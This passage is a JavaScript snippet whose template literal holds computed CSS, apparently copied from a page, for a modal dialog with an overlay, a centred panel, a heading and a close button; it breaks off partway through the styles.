// Step 1: Replace the current HTML with outerHTML
const outerHTML = `
	<div>
		<style>
			#DIV_1 {
				block-size: 742.4px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				bottom: 0px;
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				height: 742.4px;
				inline-size: 1536px;
				inset-block-end: 0px;
				inset-block-start: 0px;
				inset-inline-end: 0px;
				inset-inline-start: 0px;
				left: 0px;
				perspective-origin: 768px 371.2px;
				position: fixed;
				right: 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				top: 0px;
				transform-origin: 768px 371.2px;
				width: 1536px;
				z-index: 1300;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_1*/

			#DIV_1:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_1:after*/

			#DIV_1:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_1:before*/

			#DIV_2 {
				align-items: center;
				block-size: 742.4px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				bottom: 0px;
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: flex;
				height: 742.4px;
				inline-size: 1536px;
				inset-block-end: 0px;
				inset-block-start: 0px;
				inset-inline-end: 0px;
				inset-inline-start: 0px;
				justify-content: center;
				left: 0px;
				perspective-origin: 768px 371.2px;
				position: fixed;
				right: 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				top: 0px;
				transform-origin: 768px 371.2px;
				width: 1536px;
				z-index: -1;
				background: rgba(0, 0, 0, 0.5) none repeat scroll 0% 0% / auto padding-box border-box;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
				transition: opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1) 0s;
			}

			/*#DIV_2*/

			#DIV_2:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_2:after*/

			#DIV_2:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_2:before*/

			#DIV_3,
			#DIV_40 {
				block-size: 0px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				height: 0px;
				inline-size: 1536px;
				perspective-origin: 768px 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				transform-origin: 768px 0px;
				width: 1536px;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_3, #DIV_40*/

			#DIV_3:after,
			#DIV_40:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_3:after, #DIV_40:after*/

			#DIV_3:before,
			#DIV_40:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_3:before, #DIV_40:before*/

			#DIV_4 {
				align-items: center;
				block-size: 742.4px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: flex;
				height: 742.4px;
				inline-size: 1536px;
				justify-content: center;
				perspective-origin: 768px 371.2px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				transform-origin: 768px 371.2px;
				width: 1536px;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
				transition: transform 0.3s cubic-bezier(0, 0, 0.2, 1) 0s;
			}

			/*#DIV_4*/

			#DIV_4:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_4:after*/

			#DIV_4:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_4:before*/

			#DIV_5 {
				block-size: 435.8px;
				border-block-end-color: rgba(0, 0, 0, 0.2);
				border-block-end-style: solid;
				border-block-end-width: 0.8px;
				border-block-start-color: rgba(0, 0, 0, 0.2);
				border-block-start-style: solid;
				border-block-start-width: 0.8px;
				border-end-end-radius: 4px;
				border-end-start-radius: 4px;
				border-inline-end-color: rgba(0, 0, 0, 0.2);
				border-inline-end-style: solid;
				border-inline-end-width: 0.8px;
				border-inline-start-color: rgba(0, 0, 0, 0.2);
				border-inline-start-style: solid;
				border-inline-start-width: 0.8px;
				border-start-end-radius: 4px;
				border-start-start-radius: 4px;
				bottom: 194.6px;
				box-shadow: rgba(0, 0, 0, 0.2) 0px 11px 15px -7px, rgba(0, 0, 0, 0.14) 0px 24px 38px 3px, rgba(0, 0, 0, 0.12) 0px 9px 46px 8px;
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: flex;
				height: 435.8px;
				inline-size: 576px;
				inset-block-end: 194.6px;
				inset-block-start: 48px;
				inset-inline-end: 448px;
				inset-inline-start: 448px;
				left: 448px;
				margin-block-end: 32px;
				margin-block-start: 32px;
				margin-inline-end: 32px;
				margin-inline-start: 32px;
				max-block-size: calc(100% - 64px);
				max-height: calc(100% - 64px);
				max-inline-size: 576px;
				max-width: 576px;
				padding-block-end: 20px;
				padding-block-start: 20px;
				padding-inline-end: 20px;
				padding-inline-start: 20px;
				perspective-origin: 288px 217.9px;
				position: absolute;
				right: 448px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				scrollbar-width: thin;
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				top: 48px;
				transform-origin: 288px 217.9px;
				width: 576px;
				background: rgb(249, 245, 250) none repeat scroll 0% 0% / auto padding-box border-box;
				border: 0.8px solid rgba(0, 0, 0, 0.2);
				border-radius: 4px;
				flex-flow: column nowrap;
				font: 16px / 24px SVN-Poppins;
				margin: 32px;
				outline: rgba(0, 0, 0, 0.87) none 0px;
				overflow: auto;
				padding: 20px;
				transition: box-shadow 0.3s cubic-bezier(0.4, 0, 0.2, 1) 0s;
			}

			/*#DIV_5*/

			#DIV_5:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_5:after*/

			#DIV_5:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_5:before*/

			#H2_6 {
				block-size: 64px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				height: 64px;
				inline-size: 534.4px;
				margin-block-end: 0px;
				margin-block-start: 0px;
				min-block-size: auto;
				min-height: auto;
				min-inline-size: auto;
				min-width: auto;
				padding-block-end: 16px;
				padding-block-start: 16px;
				padding-inline-end: 24px;
				padding-inline-start: 24px;
				perspective-origin: 267.2px 32px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				transform-origin: 267.2px 32px;
				width: 534.4px;
				border: 0px none rgba(0, 0, 0, 0.87);
				flex: 0 0 auto;
				font: 700 20px / 32px SVN-Poppins;
				margin: 0px;
				outline: rgba(0, 0, 0, 0.87) none 0px;
				padding: 16px 24px;
			}

			/*#H2_6*/

			#H2_6:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 700 20px / 32px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#H2_6:after*/

			#H2_6:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 700 20px / 32px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#H2_6:before*/

			#BUTTON_7 {
				align-items: center;
				appearance: none;
				block-size: 36px;
				border-block-end-color: rgb(78, 86, 92);
				border-block-end-style: none;
				border-block-end-width: 0px;
				border-block-start-color: rgb(78, 86, 92);
				border-block-start-style: none;
				border-block-start-width: 0px;
				border-end-end-radius: 1000px;
				border-end-start-radius: 1000px;
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-end-style: none;
				border-inline-end-width: 0px;
				border-inline-start-color: rgb(78, 86, 92);
				border-inline-start-style: none;
				border-inline-start-width: 0px;
				border-start-end-radius: 1000px;
				border-start-start-radius: 1000px;
				bottom: 388.2px;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				display: flex;
				height: 36px;
				inline-size: 36px;
				inset-block-end: 388.2px;
				inset-block-start: 10px;
				inset-inline-end: 10px;
				inset-inline-start: 528.4px;
				justify-content: center;
				left: 528.4px;
				padding-block-end: 6px;
				padding-block-start: 6px;
				perspective-origin: 18px 18px;
				position: absolute;
				right: 10px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				top: 10px;
				transform-origin: 18px 18px;
				transition-behavior: normal, normal, normal, normal;
				user-select: none;
				vertical-align: middle;
				width: 36px;
				background: rgb(255, 255, 255) none repeat scroll 0% 0% / auto padding-box border-box;
				border: 0px none rgb(78, 86, 92);
				border-radius: 1000px;
				font: 500 14px / 24.5px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
				padding: 6px;
				transition: background-color 0.25s cubic-bezier(0.4, 0, 0.2, 1) 0s, box-shadow 0.25s cubic-bezier(0.4, 0, 0.2, 1) 0s, border-color 0.25s cubic-bezier(0.4, 0, 0.2, 1) 0s, color 0.25s cubic-bezier(0.4, 0, 0.2, 1) 0s;
			}

			/*#BUTTON_7*/

			#BUTTON_7:after {
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(78, 86, 92);
				font: 500 14px / 24.5px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
			}

			/*#BUTTON_7:after*/

			#BUTTON_7:before {
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(78, 86, 92);
				font: 500 14px / 24.5px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
			}

			/*#BUTTON_7:before*/

			#svg_8 {
				block-size: 24px;
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				display: block;
				fill: rgb(78, 86, 92);
				height: 24px;
				inline-size: 24px;
				min-block-size: auto;
				min-height: auto;
				min-inline-size: auto;
				min-width: auto;
				overflow-clip-margin: content-box;
				perspective-origin: 12px 12px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				transform-origin: 12px 12px;
				user-select: none;
				width: 24px;
				border: 0px none rgb(78, 86, 92);
				flex: 0 0 auto;
				font: 500 24px / 42px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
				overflow: hidden;
				transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1) 0s;
			}

			/*#svg_8*/

			#svg_8:after {
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				fill: rgb(78, 86, 92);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(78, 86, 92);
				font: 500 24px / 42px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
			}

			/*#svg_8:after*/

			#svg_8:before {
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				fill: rgb(78, 86, 92);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(78, 86, 92);
				font: 500 24px / 42px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
			}

			/*#svg_8:before*/

			#path_9 {
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				d: path("M 19 6.41 L 17.59 5 L 12 10.59 L 6.41 5 L 5 6.41 L 10.59 12 L 5 17.59 L 6.41 19 L 12 13.41 L 17.59 19 L 19 17.59 L 13.41 12 Z");
				fill: rgb(78, 86, 92);
				perspective-origin: 0px 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				transform-origin: 0px 0px;
				user-select: none;
				border: 0px none rgb(78, 86, 92);
				font: 500 24px / 42px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
			}

			/*#path_9*/

			#path_9:after {
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				fill: rgb(78, 86, 92);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(78, 86, 92);
				font: 500 24px / 42px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
			}

			/*#path_9:after*/

			#path_9:before {
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				fill: rgb(78, 86, 92);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(78, 86, 92);
				font: 500 24px / 42px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
			}

			/*#path_9:before*/

			#SPAN_10 {
				block-size: 36px;
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-end-end-radius: 1000px;
				border-end-start-radius: 1000px;
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				border-start-end-radius: 1000px;
				border-start-start-radius: 1000px;
				bottom: 0px;
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				display: block;
				height: 36px;
				inline-size: 36px;
				inset-block-end: 0px;
				inset-block-start: 0px;
				inset-inline-end: 0px;
				inset-inline-start: 0px;
				left: 0px;
				perspective-origin: 18px 18px;
				pointer-events: none;
				position: absolute;
				right: 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				top: 0px;
				transform-origin: 18px 18px;
				user-select: none;
				width: 36px;
				z-index: 0;
				border: 0px none rgb(78, 86, 92);
				border-radius: 1000px;
				font: 500 14px / 24.5px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
				overflow: hidden;
			}

			/*#SPAN_10*/

			#SPAN_10:after {
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				pointer-events: none;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(78, 86, 92);
				font: 500 14px / 24.5px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
			}

			/*#SPAN_10:after*/

			#SPAN_10:before {
				border-block-end-color: rgb(78, 86, 92);
				border-block-start-color: rgb(78, 86, 92);
				border-inline-end-color: rgb(78, 86, 92);
				border-inline-start-color: rgb(78, 86, 92);
				box-sizing: border-box;
				caret-color: rgb(78, 86, 92);
				color: rgb(78, 86, 92);
				column-rule-color: rgb(78, 86, 92);
				cursor: pointer;
				pointer-events: none;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(78, 86, 92);
				text-emphasis-color: rgb(78, 86, 92);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(78, 86, 92);
				font: 500 14px / 24.5px SVN-Poppins;
				outline: rgb(78, 86, 92) none 0px;
			}

			/*#SPAN_10:before*/

			#DIV_11 {
				block-size: 330.2px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
